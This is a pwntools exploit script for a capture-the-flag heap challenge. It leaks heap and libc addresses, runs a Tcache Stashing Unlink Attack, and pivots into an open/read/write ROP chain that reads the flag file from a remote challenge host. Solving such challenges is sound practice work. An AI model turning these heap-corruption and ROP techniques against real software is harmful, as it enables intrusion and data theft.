from pwn import *

#context.log_level = 'debug'

#p = process('./RedPacket_SoEasyPwn1')
p = remote('node4.buuoj.cn', 27708)
elf = ELF('./RedPacket_SoEasyPwn1')
libc = ELF('libc-2.29.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.29/64/libc-2.29.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def alloc(index, size, content):
    sla(b'Your input: ', b'1')
    sla(b'idx: ', str(index).encode())
    sla(b'0x400): ', str(size).encode())
    sa(b'content: ', content)

def delete(index):
    sla(b'Your input: ', b'2')
    sla(b'idx: ', str(index).encode())

def edit(index, content):
    sla(b'Your input: ', b'3')
    sla(b'idx: ', str(index).encode())
    sa(b'content: ', content)

def show(index):
    sla(b'Your input: ', b'4')
    sla(b'idx: ', str(index).encode())

[alloc(i, 4, b'a') for i in range(7)]
[delete(i) for i in range(7)]


[alloc(i, 2, b'a') for i in range(6)]
[delete(i) for i in range(6)]

show(6)
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - (0x55e4e4ac46c0 - 0x55e4e4ac2000)
success('heap_base -> {}'.format(hex(heap_base)))

alloc(1, 4, b'a') #small bin[1]
alloc(3, 3, b'a')
delete(1)
show(1)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

alloc(2, 3, b'a')
alloc(2, 3, b'a')

alloc(2, 4, b'a') #small bin[2]
alloc(3, 3, b'a')
delete(2)

alloc(3, 3, b'a')
alloc(3, 3, b'a') #there is 2 chunks in small bins

edit(2, b'\x00' * 0x300 + p64(0) + p64(0x101) + p64(heap_base + 0x37e0) + p64(heap_base + 0x250 + 0x10 + 0x800 - 0x10))

alloc(2, 2, b'\x21\x21') #Tcache Stashing Unlink Attack, it will replace heap_base + 0x250 + 0x10 + 0x800 with main_arena

pop_rdi_ret = 0x26542 + libc_base
pop_rsi_ret = 0x26f9e + libc_base
pop_rdx_ret = 0x12bda6 + libc_base

leave = 0x58373 + libc_base

rop = b'flag' + b'\x00' * 4 + p64(pop_rdi_ret) + p64(heap_base + 0x4940)
rop += p64(pop_rsi_ret) + p64(0)
rop += p64(libc_base + libc.sym['open'])
rop += p64(pop_rdi_ret) + p64(3)
rop += p64(pop_rsi_ret) + p64(heap_base + 0x270)
rop += p64(pop_rdx_ret) + p64(0x40)
rop += p64(libc_base + libc.sym['read'])
rop += p64(pop_rdi_ret) + p64(1)
rop += p64(pop_rsi_ret) + p64(heap_base + 0x270)
rop += p64(pop_rdx_ret) + p64(0x40)
rop += p64(libc_base + libc.sym['write'])

#debug('b *$rebase(0x143c)')

alloc(1, 4, rop)
sla(b'Your input: ', b'666')
sa(b'say?', b'a' * 0x80 + p64(heap_base + 0x4940) + p64(leave))

print(p.recv())